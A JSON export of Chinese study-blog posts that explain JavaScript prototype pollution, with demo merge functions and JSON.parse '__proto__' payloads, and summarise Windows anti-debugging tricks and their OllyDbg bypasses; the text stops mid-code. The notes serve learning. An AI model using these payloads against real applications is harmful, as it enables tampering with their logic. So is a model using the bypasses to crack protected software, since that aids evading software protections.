[{"id":"9801b7a6e4282f27dc334c37705d70aa","title":"原型链污染","content":"引言\n之前看过原型链污染的相关内容，但是一直决定云里雾里，今天总结的时候，彻底弄明白了。\n\njs原型链污染\nObject.prototype中是包括一些属性的，详细见黑框\n下图中的Foo.prototype、Object.prototype都是原型对象\n把Object.prototype想象成class A{}，会更好理解下面的内容\n\n\njs创建对象的3种方式&lt;script type=\"text/javascript\">\n    // 第一种方式：字面量\n    var o1 = &#123;name: 'o1'&#125;\n    var o2 = new Object(&#123;name: 'o2'&#125;)\n      // 第二种方式：构造函数\n    var M = function (name) &#123; this.name = name; &#125;\n    var o3 = new M('o3')\n      // 第三种方式：Object.create\n    var p = &#123;name: 'p'&#125;\n    var o4 = Object.create(p)\n\n　　console.log(o1)　　　　\n　　console.log(o2)\n　　console.log(o3)\n　　console.log(o4)\n&lt;/script>\n\nQ：搞明白普通对象和Object和{} 的关系\nQ：{}其实和Object是一样的\n\n这里let o1 &#x3D; {}，相当于实例化了一个对象o1，所以o1.__proto__是{}，也是Object.prototype\n\n\nQ：函数也有__proto__\n函数有prototype,对象是没有的。\n\n函数也是有__proto__的，因为函数也是对象。函数的__proto__指向的是Function.prototype。\n也就是说普通函数是Function这个构造函数的一个实例。\n\nQ：特殊的地方\n\n\n这种情况下，我直接new function，而不是像前面定义一个构造函数，再new\n这里在创建对象时，并没有显示的指定构造函数，所以javascript会用默认的构造函数创建，****而默认的构造函数会将对象的原型指向一个空对象 {}。\n所以user.__proto __  &#x3D; {}, user.__proto __.__proto __  &#x3D; {}\n\nvar user = new function()&#123;\n    // this.userinfo = new function()&#123;\n    this.isVIP = false;\n    this.isAdmin = false;\n    this.isAuthor = false;     \n    // &#125;;\n  &#125;\n\n原型链https://www.cnblogs.com/chengzp/p/prototype.html\n\n这里实例可以通过constructor获取自己的构造函数\n\n\n\n对象的__proto__它的是原型，而原型也是一个对象，也有__proto__属性，原型的__proto__又是原型的原型，就这样可以一直通过__proto__想上找，这就是原型链，当向上找找到Object的原型的时候，这条原型链就算到头了。\n\n原型对象和实例之间的联系\n通过一个构造函数创建出来的多个实例，如果都要添加一个方法，给每个实例去添加肯定很麻烦。这时就该用上原型了。在实例的原型上添加一个方法，这个原型的所有实例便都有了这个方法\n\nvar M = function (name) &#123; this.name = name; &#125;\nvar o3 = new M('o3')\nvar o5 = new M()\no3.__proto__.say=function()&#123;\n   console.log('hello world')\n&#125;\n\no3.say()\no5.say()\n\n\n\n一步的原型链污染看Keyfunction look(target) &#123;\n  // o1 o2 key =1 \n    for (let key in target) &#123;\n\t\tconsole.log(key)\n    &#125;\n&#125;\nlet o1 = &#123;&#125;\nlet o2 = JSON.parse('&#123;\"a\": 1, \"__proto__\": &#123;\"b\": 2&#125;&#125;')\nlet o3 = &#123;a: 1, \"__proto__\": &#123;b: 2&#125;&#125;\nlook(o2)\nlook(o3)\n\n\n污染过程https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript\nQ : 情况1\n\n这是代码1的输出结果\n\n\nfunction merge(target, source) &#123;\n    for (let key in source) &#123;\n        if (key in source &amp;&amp; key in target) &#123;\n            merge(target[key], source[key])\n        &#125; else &#123;\n            target[key] = source[key]\n        &#125;\n    &#125;\n&#125;\nlet o1 = &#123;&#125;\nlet o2 = &#123;a: 1, \"__proto__\": &#123;b: 2&#125;&#125;\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n\no3 = &#123;&#125;\nconsole.log(o3.b)\n\n\n这种情况，因为Key没有__proto__，在执行merge函数时，__proto__已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型。\n\n\n\nQ：情况2\n\n看一下此时o2的key，发现有a和proto，此时的o2是一个json对象\n\n\nlet o1 = &#123;&#125;\nlet o2 = JSON.parse('&#123;\"a\": 1, \"__proto__\": &#123;\"b\": 2&#125;&#125;')\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n\no3 = &#123;&#125;\nconsole.log(o3.b)\n\n\nJSON.parse会把字符串转换为js对象，此时认为__proto__是key\n也就是在执行merge函数时，会o1[__proto__] = o2[__proto__]，由于o1是没有__proto__这个key的，所以就会找o1的原型，Object.prototype，o2有__proto__这个key，所以就在Object.prototype中添加了{b : 2}\n\n就是o1[proto]代表o1的原型Object.prototype，但是o2[proto]是值，因为它有__proto__这个Key，拜Json.parse所赐\n\n可以看到o1.__proto__和Object.prototype是相等的，Object.prototype理解成所有类的父类，那么自然给其他的都添加了这个属性\n\n\n\n参考上面的这个图，也能看出来Object.prototype的地位，所有函数的prototype都是Object.prototype的子类\n\n\n二步的原型链污染function copy(object1, object2)&#123;\n    for (let key in object2) &#123;\n        if (key in object2 &amp;&amp; key in object1) &#123;\n            copy(object1[key], object2[key])\n        &#125; else &#123;\n            object1[key] = object2[key];\n\n        &#125;\n    &#125;\n  &#125;\nvar user = new function()&#123;\n    this.userinfo = new function()&#123;\n    this.isVIP = false;\n    this.isAdmin = false;\n    this.isAuthor = false;     \n    &#125;;\n  &#125;\nbody=JSON.parse('&#123;\"__proto__\":&#123;\"__proto__\":&#123;\"query\":\"123\"&#125;&#125;&#125;');\ncopy(user.userinfo,body);\n\nconsole.log(user.query);\n\n对于这段js代码，污染过程如下：\n\n\n遍历object2中的key，只有一个__proto__\n那么当执行到object1[key] = object2[key]这句时，变成了\n\nuser.userinfo[__proto__] &#x3D; &#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;123&quot;&#125;&#125;\n\n\n所以相当于&#123;&#125; = &#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;123&quot;&#125;&#125;\n\n就是&#123;&#125;[__proto__] = &#123;&quot;query&quot;:&quot;123&quot;&#125;\n\n即 &#123;Object.prototype&#125; = &#123;&quot;query&quot;:&quot;123&quot;&#125;\n\n成功添加属性为123\n\n所以污染成功\n\n\nQ：值得注意的是\n\n这里copy(user.userinfo,body);和copy(user,body);效果是相同的，因为user和user.userinfo都是通过默认构造器创建的，都是通过两个__proto__到达Object.prototype\n\n\n总结\n综上，想要原型链污染，首先要找到敏感函数\n其次在构造时，如果o1是{}，那么只需要一个__proto__就能到达Object.prototype。如果o1是通过默认的构造函数(Object{})创建的，那么需要两个__proto__。\n\n","slug":"原型链污染","date":"2024-02-29T08:42:20.000Z","categories_index":"","tags_index":"web","author_index":"XyM4ster"},{"id":"ad9b5bba7260fe69f150a16ce9de4386","title":"re-engineer-core-principle-07","content":"引言\n终于到第七部分了，快看完了\n\n0x50 反调试技术50.1 反调试技术\n反调试技术有很强的依赖性。有些反调试技术仅在特定版本的os下工作\n本章的大部分技术可以用在Windows XP SP3(32位)和Win7 32位下\n\n50.3 反调试技术分类\n根据破解方法分成静态和动态两组\n\n\n\n静态反调试\n主要就是探测调试器，如果探测到，就让恒旭无法运行\n\n动态反调试\n在破解了静态反调试之后，想了解程序的工作原理，需要动态调试，查看程序的代码和数据\n但是如果程序中应用了动态反调试，很难再使用调试器的跟踪技术，动态反调试器会扰乱调试器跟踪的功能，让我们无法查看代码和数据\n\n0x51 静态反调试技术Q：为啥要用静态反调试\n\n就是不让我正常运行代码\n\n51.2 PEB\n利用PEB结构体信息，可以查看当前进程是否处于被调试状态。这个前面学过，就用它的BeingDebugged\n\nQ：反调试中用到的PEB结构体成员\n\nBeingDebugged\n进程处于被调试状态时，PEB.BeingDebugged的值是1。\n\nQ：IsDebuggerPresent() API\n\n这个前面也学过，他就是调用了PEB.BeingDebugged\n\n\n获取TEB，获取PEB，再获取IsDebugged。\n\n\nQ：破解之法\n\n借助Ollydbg的调试功能，把IsDebugged设置成0\n\nLdr(+0xC)\n调试进程时，其堆内存区域会出现一些特殊标识，表示它正处在被调试状态。\n\n未使用的堆内存区域全部填充着0xFEEEFEEE，这证明正在调试进程。\n\n\nPEB.ldr是一个指向_PEB_LDR_DATA结构体的指针， _PEB_LDR_DATA结构体恰好是在堆内存中创建的，所以扫描堆区就可以看到是不是有0xFEEEFEEE\n\nPEB的起始地址是2F0000，Ldr的地址是 77E2DB00\n\n\n\nQ：破解之法\n\n把0xFEEEFEEE全部变成null\n\n\n\n\n\n\n\n提示\n这种方法在win11中是没用的\n\n\nProcess Heap(+0x18)\nPEB.ProcessHeap是指向HEAP结构体的指针，地址是00490000\n\n\n\n当进程处于被调试状态时，FLags和ForceFlags会被设定为特定值\n\n\nQ：GetProcessHeap()\n\nProcessHeap可以通过PEB直接获取，也可以通过这个API获取\n这个API也和上面的IsDebuggerPresent() API一样\nTEB —&gt; PEB —&gt; ProcessHeap\n\n\n\nQ：Flags 0xC &amp; ForceFlags 0x10\n\n\n进程正常运行时，Flags的值为0x2，ForceFlags的值是0x0\n\nQ：破解\n\n就改成正常值\n\nNtGlobalFlag(+0x68)\n调试进程时，PEB.NtGlobalFlag的值会被设置为0x70。所以可以检测这个值\n\n\n破解的时候，把它修改成0\n\n这个在win11也没用\n\n\n练习 StaAd_PEB.exe\n运行这个进程后，显示\n\n\n\nQ：按照上面学的，逐步破解\n\n在遇到第一个调用IsDebuggerPresent() API后，把参数值改一下，此时函数返回值就是0了\n\n\n\n这个等会调试\n51.3 NtQueryInformationProcess()\n另一种利用NtQueryInformationProcess() API探测调试器。这个API可以获得各种和进程调试相关的信息\n\n\n给这个函数的第二个参数PROCESSINFOCLASS processInformationClass指定特定值，并调用该函数，相关信息就会设置到第三个参数PVOID ProcessInformation中。\n\nPROCESSINFOCLASS 是枚举类型，可以拥有下面这些值，重点看红框中的\n\n\n  \nProcessDebugPort\n进程处于调试状态时，系统会给它分配一个调试端口(Debug Port)。\n\nProcessInformationClass参数的值设置为ProcessDebugPort时，调用NtQueryInformationProcess()函数可以获取调试端口\n\n如果处于非调试状态，那么变量dwDebugPort的值是0。如果处在调试状态，变量的值就是0xFFFFFFFF。\n\n\n也就是我给第二个枚举类型的参数设置成ProcessDebugPort，运行之后的相关信息就会放到第三个参数dwDebugPort中，以此来观察进程是否在调试状态\n\n\nQ：CheckRemoteDebuggerPresent()\n\n它和IsDebuggerPresent() API类似，可以检测进程是不是在调试状态，\n\n它除了可以检测当前进程，也可以检测其他进程。\n\n发现这个进程内部嗲用了NtQueryInformationClass API\n\n\n\nProcessDebugObjectHandle(0x1E)\n调试进程时会生成调试对象。\n\n也就是设置第二个参数的值是0x1E ProcessDebugObjectHandle时，调用后第三个参数就能获得调试对象的句柄。\n\n进程处于调试状态时，调试对象句柄的值就存在。如果出于非调试状态，调试对象句柄的值是NULL。\n\n\n\nProcessDebugFlags(0x1F)\nDebugFLags的值也可以判断进程是不是在被调试状态\n\n设置NtQuertInformationProcess()的值是0x1F，调用函数之后通过第三个参数即可获取调试标志的值。\n\n如果是0表示处于被调试状态，是1，表示不在调试状态\n\n\n\n练习 StaAD_NtQIP.exe\n以管理员运行ollydbg，在ollydbg中打开StaAD_NtQIP.exe，之后f9运行\n\n\n\n破解\n如果只是调用了几次API，那可以手动修改值，如果调用很多次，那就得用API钩取了\n\nQ：确定钩取函数的位置\n\nImageBase是0040 0000, Section Alignment是1000\n\n所以.text节区就是从00401000，到00407D69，从00407D6A到00408000都是null padding\n\n\n用dll注入钩取API时，钩取函数位于要注入的DLL文件内部。将钩取代码设置在最后一个null padding区域\n\n\nQ：使用5字节的代码修改\n\n进入原来的NtQueryInformationProcess() API处，修改成JMP\n\n\n\n正常的5字节代码修改，应该在API的开头修改成JMP，但是这里确在下面的位置修改，原因是：\n\n有些PE保护器会检测NtQueryInformationProcess()  API起始地址的第一个字节，如果不是B8，就认为这个API会被钩取\n\n\n\nQ：编写钩取函数\n\n这个钩取函数首先调用原来的NtQueryInformationProcess() ，返回值也是原来的\n在中间加上类似于switch case的结构，如果ESp+c是 7，就表明是debugport，把对应的值改成0\n另两个也是同理。\n\n\n51.4 NtQuerySystemInformation()\n基于调试环境检测的反调试技术\n前面是通过探测调试器来判断进程是否处于被调试状态。就说调用API\n也有一些间接探测调试器的方法。\n运用这种反调试技术可以检测当前os是否在调试模式下运行\n\n使用windbg调试系统内核Q：ntdll!NtQuerySystemInformation() API\n\n它是一个系统函数，用来获取当前运行的多种os信息\n\n\nSYSTEM_INFOAMTION_CLASS SystemInformationClass参数中指定需要的系统信息类型\n\n将某结构体的地址传给PVOID SystemInformation参数，API返回时，这个结构体中填充着相关信息。\n\nSYSTEM_INFOAMTION_CLASS是枚举类型\n\n\n像SystemInformationClass参数中传入0x23，就可以判断当前os是不是在调试模式下运行\n\n\nSystemKernelDebuggerInformation(0x23)\n实际的反调试源代码\n\n\n这个代码很简单，定义了_SYSTEM_KERNEL_DEBUGGER_INFORMATION结构体，并且把DebuggerEnabled初始化为0\n\n在调用NtQuerySystemInformation之后，如果处于调试状态，那么会修改debuggerInfo结构体的值，把DebuggerEnabled设置为1\n\n\n破解之法\n在Windows XP系统中编辑bootini文件，删除“&#x2F;debugport&#x3D;coml  &#x2F;baudrate&#x3D;115200&#x2F;Debug值。\n在Windows7系统的命令行窗口执行“bcdedit&#x2F;debugoft”命令即可。并且，若重启系统则要以正常模式(Normal Mode)启动。\n\n51.5 NtQueryObject()\n系统中的某个调试器调试进程时，会创建一个调试对象类型的内核对象，\n我们可以检测该对象是否存在，就可以判断是否有进程正在调试\n\nQ：NtQueryObject()  API\n\n\n调用这个API时，先向第二个参数 OBJECT_INFORMATION_CLASS objectInformationClass赋予某个特定值，调用API后，包含相关信息的结构体指针就会返回第三个参数PVOID ObjectInformation\n\nOBJECT_INFORMATION_CLASS objectInformationClass是枚举类型\n\n\n使用ObjectAllTypesInformation获取系统中所有对象的信息，检测里面是不是存在调试对象\n\n\nQ：NtQueryObject() API使用方法\n\n获取内核对象信息链表的大小，传的是ObjectAllTypesInformation，lSize被赋值\n\n\n分配内存：分配lSize大小的内存\n\n\n获取内核对象信息链表\n\n\n调用pNtQueryObject之后，获取所有对象的信息，并且存在pbuf中\n把pbuf转成 POBJECT_ALL_INFORMATION类型，OBJECT_ALL_INFORMATION里面包含OBJECT_TYPE_INFORMATION数组\n遍历这个数组，就可以知道是不是存在调试对象\n\n\n确定调试对象的对象类型\n\n下面这个是整个过程的完整代码\n\n\n\n\n\n练习StaAD_NtQO.exe\n\n调试StaAD_NtQO.exe，发现在调用ZwQueryObject处，参数是3，也就是要获取alltypesinformation，如果我改成0，让他变成basic information，就无法检测到调试器了\n\n\n\n\n51.6 ZwSetInformationThread()\n这部分介绍的是强制分离(Detach）被调试者和调试器的技术。\n\n利用ZwSetInformationThread() API，被调试者可以把自身从调试器中分离出来\n\n\nZwSetInformationThread()函数是一个系统原生API(System Native API)，它是用来为线程设置信息的\n\n这个函数有两个参数，第一个参数ThreadHandle用来接收当前线程的句柄，第二个参数ThreadInformationClass表示线程信息类型。\n\n如果第二个参数被设置成了0x11，调用该函数后，调试进程就会被分离出来\n\n顾名思义，意思就是向debugger隐藏这个线程\n\n\nZwSetInformationThread()  API不会对正常运行的程序有任何影响，但如果运行的是调试器程序，调用这个API，就会让调试器终止运行，同时终止自身进程\n\n\n练习StaAD_ZwSIT.exe\n破解\n就是把它改成0就行了，当然也可以hook它\n\n\n\n\n\n\n\n提示\n利用ZwSetInformationThread()进行反调试的工作原理是: 将线程隐藏起来，调试器就接收不到信息，从而无法调试。\n另外，Windows XP 以后新增了 DebugActive-ProcessStop()API。\n\n\n\n\n这个API用来分离调试器和被调试进程，从而停止调试。\n前面的ZwSetInformationThread() API是用来隐藏线程的\n\n51.7  TLS回调函数\n因为TLS回调函数先于EP代码运行，所以可以在里面加API，比如IsDebuggerPresent()来判断是不是在调试\n\n51.8 ETC\n前面介绍的方法都是判断进程是不是在调试状态\n\n这里另辟蹊径，可以借助Win32 API来判断是不是逆向分析的专用系统，相当于判断外部的条件\n\n\n\n51.9 小结\n调试过程中还会遇到更多反调试技术，这些反调试方法你可能之前从未见过，只要认真分析、查找相关资料般都能找到好的破解之道，这是积累经验、不断进步的必经之路。\n这段话送给自己，希望之后真正做题，或者逆向分析的时候，不要着急看wp，一步一步的仔细分析，相信自己可以逐步积累，慢慢的变成逆向分析大佬！\n\n0x52 动态反调试52.2 异常\n异常应用于反调试技术。\n正常运行的进程发生异常时，os会调用进程中注册的SEH处理。\n如果进程在调试状态下，调试器就会处理异常。\n利用这个特征可以判断是正常运行，还是调试运行\n\nSEHEXCEPTION_BREAKPOINT\n发生BREKPOINT异常时，如果正常运行，就会调用已经注册过的SEH\nSEH中有修改EIP值的代码。\n\n\n如果处在调试状态，就会交给调试器处理，系统会停止运行。\n之前学过可以用shift + f9，把异常抛给被调试者，然后调用SEH处理\n\nQ：练习DynAD_SEH.exe\n\n这里首先是个明显的安装SEH的操作\n\n\n\n接着出发INT3异常\n\n\n现在是调试状态，所以由调试器处理，接着会JMP到FFFFFFFF处，无法处理\n\n\n\n\n\n\n\n\n\n提示\n上面的代码，在遇到调试状态时，会直接终止进程。\n但是一些程序，会让你跳转到垃圾代码，如果你一直跟踪垃圾代码，会非常浪费时间。\n\n\n\n整个代码的执行流是\n\n\n\nQ：如果正常运行上面的程序\n\n那么在遇到异常后，就会调用刚才注册过的SEH，也就是调用40102C处的handler\n\n\n参考前面的笔记，此时handler的第三个参数是pContext结构体\n\n\nEAX + B8是eip的值，也就是把401040给eip\n\n然后异常处理器返回0\n\n接着，发生异常的线程从修改后的eip地址处开始运行\n\n\n\n\n\n\n\n\n提示\n如果不处理异常，那么eip的值就会保持不变，还是会发你回到INT3指令处。同时再次调用40102C处的SEH，最终陷入无限循环，造成栈溢出，导致进程终止。\n\n\nQ：删除SEH\n\n\n根据前面学的，这里是典型的删除SEH的函数。\n把当前栈顶的值给FS:[0]，并pop掉当前栈顶的值\n接着删除handler\n\nQ：破解之法\n\n在调试器中让ollydbg忽略INT3 breaks，调试器就会忽略被调试进程中发生的INT3异常。让被调试进程自己处理\n此时在40102D处设置断点，程序是可以运行到这里的\n\nSetUnhandledExceptionFilter()\n进程中发生异常时，如果SEH未处理或者注册的SEH不存在，此时就会调用执行系统的异常处理函数kernel32!UnhandledExceptionFilter()  API\n\n该函数内部会运行系统的最后一个异常处理器。名叫 Top Level Filter 或者 Last Exception Filter\n\n这个异常处理器会弹出错误消息提示框，然后终止进程运行。\n\n\nkernel32!UnhandledExceptionFilter()  API内部调用了ntdll!NtQueryInformationProcess()  API 静态反调试技术，判断是否正在调试进程\n\n如果进程正常运行，那么就运行系统最后的异常处理器\n\n如果进程正在调试，那就把异常派送给调试器\n\n\nQ：通过Kernel32!SetUnhandledExceptionFilter() API可以修改系统最后的异常处理器\n\n\n如果我调用这个函数修改系统的最后一个异常处理器，只要把新的Top Level Exception Filter的地址传给lpTopLevelExceptionFilter参数\n\n它的返回值是上一个Last Exception Filter的函数地址\n\nTop Level Exception Filter函数定义是\n\n\n基于异常的反调试中，会先出发异常，然后在新注册的Last Exception Filter内部判断进程是正常运行还是调试运行\n\n\n打开DynAD_SUEF.exe\n在401030设置断点，然后运行\n\n这里首先是调用printf函数输出字符串，401087处是printf函数\n\n\n接着调用SetUnhandledExceptionFilter注册新的 Top Level Exception Filter\n\n这里保存旧的top level exception filter的地址\n\n\n\n接着这里会触发非法访问异常\n\n\n在ollydbg中设置忽略memory access 异常，然后在kenel32中search for names，找到UnhandledExceptionFilter()  API，设置断点，此时在发生异常时，按f9程序会运行到此处\n\n\n在这个API内部，这里通过看dragon的blog发现，正常情况下，EAX的值是1，代码就会跳到77782256处。这里就是反调试代码\n\n如果我把EAX改成0，7778223D处的指令就会调用401000处我设置的UnhandledExceptionFilter\n\n但是我不知道是如何发现，修改EAX的值就可以绕过反调试的？\n\n\n在运行到这里后，可以发现\n\n\n\n\n接着这里首先恢复了原来的 old top level exception handler，再次调用SetUnhandledExceptionFilter。恢复她。\n\n\n我觉得这里可以修改eip的原因是，这个ECX + 4指向的是CONTEXT，然后EAX + 0B8 访问的是eip\n\n\n这里是给401052 + 4变成了401056\n\n\n然后eip就会从401056\n\n\nQ：破解方法\n\n就是让内部的反调试代码失效\n\n52.3 Timing Check\n因为在调试器中逐行跟踪程序肯定是比程序运行耗费的时间多\n\n所以Timing Check通过计算运行时间的差异来判断程序是不是处在被调试状态\n\n\n\n时间间隔 测量法\n测量的方法包括下面两类：\n一类是利用CPU的计数器\n另一类是利用系统的实际时间\n\n\n\n\n\n\n\n\n\n\n提示\nRDTSC：Read Time Stamp Counter 读取时间戳计数器\n计数器的准确程度由高到低排列如下:RDTSC&gt;NtQueryPerformanceCounter()&gt;GetTickCount()\nNtQueryPerformanceCounter()与 GetTickCount()使用相同硬件(Performance Counter), 但二者准确程度不同(NtQueryPerformanceCounter()准确度更高)。\n而RDTSC是 CPU 内部的计数器，其准确程度最高。基于时间的方法与基于计数器的方法在实现过程上比较类似，原理也差不多。\n\n\nRDTSC\nx86 CPU中存在一个名为TSC(Time Stamp Counter 时间戳计数器)的64位寄存器\nCPU对每个Clock Cycle 时钟周期计数，然后保存到TSC\nRDTSC是一条汇编指令，用来将TSC值读入EDX:EAX寄存器。\nTSC大小为64位，高32位保存至EDX寄存器，低32位保存至EAX寄存器\n\nQ：练习DynAD_RDTSC.exe\n\n\n上述代码通过计算时间差delta，来判断进程是否处在调试状态\ndelta值不固定，从40101C到40102A中间代码区域，只要执行一次，时间就会超过0xFFFFFFFF\n\nQ：破解之法\n\n不使用跟踪，直接使用run越过相关代码\n操作第二个RDTSC的结果值\n操纵条件分支指令：\nJA执行跳转动作。只要把CF和ZF之一的值修改为1，JA就失效了。\n\n\n利用内核模式驱动程序，使RDTSC失效\n\n52.4 陷阱标志\n陷阱标志位指EFLAGS寄存器的第九个比特位\n\n\n\n单步执行\nTF值设置为1时，CPU将进入单步执行模式\n在单步执行模式中，CPU执行1条指令后会触发1个EXCEPTION_SINGLE_STEP异常，然后陷阱标志位会自动清零\n可以把EXCEPTION_SINGLE_STEP 和 SEH结合，用于反调试\n\nQ：运行DynAD_SingleStep.exe\n\n这里PUSHFD表示push eflags的值，然后和00000100进行或运算，刚好修改的是第8位的值，也就是把TF变成1\n\n\n\n在运行到40102F处时，显示出现了single step异常。如果正常运行，会运行前面注册过的SEH。如果调试运行，会继续执行下面的MOV代码\n\n\n从上面可以看出，没有办法直接修改EFLAGS寄存器的值。因此使用PUSHFD&#x2F;POPFD指令和OR运算修改陷阱标志的值。\n\n不知道为什么，我的EFLAGS寄存器的值并灭有修改。\n\n\nQ：程序划分成正常运行和调试运行的原因是\n\n在修改了EFLAGS寄存器的TF位后，发生异常，此时如果程序是正常运行，那么就会执行SEH处的代码\n如果程序是调试运行，就会继续向下执行，此时EFLAGS会清零。一直向下执行，最后JMP，进程会非正常终止\n\nQ：破解之法\n\n就是让ollydbg忽略single step异常\n\nINT 2D\n它原来是内核模式下触发断点异常的指令，也可以在用户模式下触发异常。\n但是程序调试运行时不会触发异常。\n就是在正常运行和调试运行下，状态不一样，就可以用于反调试。\n\nQ：调试INT 2D指令\n\n忽略下条指令的第一个字节\n\n\n在执行INT 2D指令之后，下一条指令的第一个字节会被忽略\n\n\n\n也就是把401020地址处的指令重新解析了，忽略第一个字节B8\n\n\n最终原来401020地址处的指令被解析成了2条指令，和之前完全不一样，这就形成了比较强的代码混淆\n\n\n\n\n\n\n\n\n提示\n改变代码字节顺序(CodeByte Ordering)扰乱程序代码的方法称为代码混淆技术该技术常用于动态反调试技术。\n\n\n\n一直运行到断点处\n\n\nINT 2D指令的另一条特征是使用f7或者f8跟踪INT 2D指令时，程序不会停在下条指令开始的地方，而是一直运行，直到遇到断点，就像用F9运行一样。\n\n\n\n\n\n\n\n提示\n以上只是INT2D 指令在 OllyDbg 调试中表现出的特征，它在其他调试器中的行为略有不同。\n在 OllyDbg 调试中执行INT2D 指令后，程序不会单步暂停，而是一直运行原因在于，执行完INT2D 指令后，原有的代码字节顺序被打乱了。\n也就是说，若指令在程序执行过程中改变，则程序不能单步暂停,而是一直执行,可以将其视为一种 Bug\n所以执行完INT2D 指令后，要想停止跟踪代码，需要事先在相应地址处设置断点。\n\n\nQ：练习DynAD_INT2D.exe\n\n\n程序如果正常运行，在遇到INT2D异常后，会转到SEH处，也就是40102A地址处，此时设置EIP为401044，EBP - 4是BOOL类型的变量，用来检测是否存在调试器，设置成FALSE。然后转到401044处继续执行\n程序如果调试运行，执行INT 2D后会跳过一个字节，继续执行401021地址处的MOV指令，将EBP - 4设置为1，也就是存在调试，然后转到401044处，输出正在调试\n\nQ：破解之法\n\n\n401044到40105B处的代码无论正常运行还是调试运行都会执行。所以可以修改代码\n\n但是在实际的调试过程中，必须跟踪SEH逐行调试代码。利用陷阱标志可以使程序进入SEH执行。\n\n双击TF，设置他是1，在40102A处设置断点，在ollydbg中设置忽略single step异常。此时再执行一条指令。那么就会触发single step异常，从而转到40102A处的SEH进行处理。\n\n\n\nQ：这里有一个问题，在执行到40101E地址处，此时我设置成TF &#x3D; 1了，为什么程序会在NOP处暂停，并且TF没有变成0，也没有触发异常呢？\n\n\n首先INT 2D原是内核指令，只要程序中有，在用户模式的调试器中它就不会被识别为正常指令，就理解成程序会停在它的下一条指令处。\n\n在TF正常是0的情况下，INT2D会忽略他的下一条指令。继续执行MOV 和JMP\n\n\n\n\n在INT 2D处，如果我设置成了TF &#x3D; 1，此时程序还是停在了NOP处，并且TF还是1。原因是，可以理解成会先识别它不是正常指令，停在401021处，再去处理single step异常的事。TF &#x3D; 1时，后面的1个字节就不会被忽略了。此时在single step模式下，再执行NOP，就会发生异常。程序跳转到SEH处\n\n\n\n\n52.5 0xCC检测\n程序调试过程中，我们一般会设置许多软件断点\n断点对应的x86指令是0xCC，如果能检测到该指令，就可以判断程序是否处于调试状态。\n基于这一想法的反调试技术就是0xCC探测\n\nQ：那是要搜索程序中所有的0xCC么？\n\n这样肯定不行，因为0xCC也可以用作操作码，立即数等，所以在进程内存的代码区只扫描0xCC肯定是不行\n\n\n\nAPI断点\n在正常调试的时候，调试某个API，我们都是在API起始处设置断点\n所以我们可以检测API代码的第一个字节是否为CC判断进程是否处在调试之中\n\n\n\n\n\n\n\n提示\n代码逆向分析人员常用的API列表如下：\n\n\n\n\nQ：练习基于API断点检测的反调试方法\n\n在程序中我们搜索names in all modules，然后双击这个API，之后按f2设置断点\n\n\n这样此时API代码的第一个字节设置好了断点，API代码开始的第一个字节已经改成了CC\n\n然后获取kernel32!CreateFileW() API起始地址的第一个字节即可\n\n\nQ：破解之法\n\n就是在设置断点的时候，不设置在起始，设置在中间。\n硬件断点也可以绕过\n\n比较检验和\n检测代码中设置的软件断点的另一个方法是，比较特定代码区域的校验和 Checksum\n\n比如程序中401000 ~ 401070地址区域的校验和值是0x12345678，那么在这个代码区域中调试时，会设置一些断点0xCC，这样新校验和和之前的就不一样了\n\n\n\n","slug":"re-engineer-core-principle-07","date":"2024-01-30T14:45:03.000Z","categories_index":"","tags_index":"re","author_index":"XyM4ster"},{"id":"080514f34f3fd257fa211ebeac34b223","title":"re-engineer-core-principle-06","content":"引言\n快看完了，加油冲冲冲！希望回家前看完\n\n0x45 TLS回调函数\nTLS(Thread Local Storage   线程局部存储)回调函数(Callback function)常用于反调试。\nTLS回调函数的运行要先于EP代码的执行，因此它可以作为一种反调试技术使用\n\n45.1 HelloTls.exeQ：运行HelloTls.exe和用ollydbg打开hellotls.exe\n\n运行显示\n\n\n用ollydbg打开显示，单击确定后，进程终止\n\n\n\n发现这两个显示的不一样，原因在于：\n\nTLS回调函数先于EP代码运行，回调函数中含有反调试代码，使程序在被调试时弹出 debugger detected消息对话框\n\n\n\n45.2 TLS\nTLS是各线程的独立的数据存储空间。\n使用TLS可以在线程内部独立使用或修改进程的全局数据或静态数据，就像对待自身的局部变量一样\n\nIMAGE_DATA_DIRECTORY[9]\n若编程中启用了TLS功能，PE头文件中就会设置TLS表\n\n这里显然是没设置，就是看一下它的位置\n\n\n\n在第三部分中，重点标注了datadirectory[9]\n\n\n\nIMAGE_TLS_DIRECTORY\n这个结构体在第5部分，PE32+中讲过\n\n\n这个Addres  Of Callbacks比较重要，该值含有TLS回调函数地址(VA)的数组。\n\n也就是可以向同一程序注册多个TLS回调函数，数组以NULL结束\n\n\n\n\n回调函数地址数组\n这个数组中存储着TLS回调函数的地址。\n进程启动运行时，在执行EP代码前，系统会逐一调用存储在该数组中的函数\n虽然下面这个只有1个TLS函数，但是实际上可以修改这个地方的值，写多个TLS函数\n\n\n45.3 TLS回调函数Q：TLS回调函数的概念\n\nTLS回调函数是指，每当创建或者终止进程的某线程时，会自动调用执行的函数，调用2次。\n创建进程的主线程时也会自动调用回调函数，且其调用执行先于EP代码。\n反调试技术利用的就是TLS回调函数的这一特征。\n\nIMAGE_TLS_CALLBACKQ：TLS回调函数的定义\n\n\n发现这个函数和DllMain很像，之前注入的dll都用了dllMain，比如dummy.dll\n\n\n他们的参数顺序和含义是一样的。\n\n参数Dllhandle是模块句柄，即加载地址\n\n参数Reason表示调用TLS回调函数的原因，具体原因有4种\n\n\n\n\n\n45.4 TlsTest.exeQ：TlsTest.exe的源代码\n\n这段代码会注册这2个TLS回调函数TLS_CALLBACK1 TLS_CALLBACK2\n#pragma data_seg(\".CRT$XLX\")\n    PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, TLS_CALLBACK2, 0 &#125;;\n#pragma data_seg()\n\nmain函数中创建用户现场ThreadProc后终止\n\n\n#include &lt;windows.h>\n\n// 指示编译器在代码中使用线程局部存储TLS\n// TLS是一种机制，允许多线程程序为每个线程分配独立的存储空间\n#pragma comment(linker, \"/INCLUDE:__tls_used\")\n\nvoid print_console(char* szMsg)\n&#123;\n    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);\n\n    WriteConsoleA(hStdout, szMsg, strlen(szMsg), NULL, 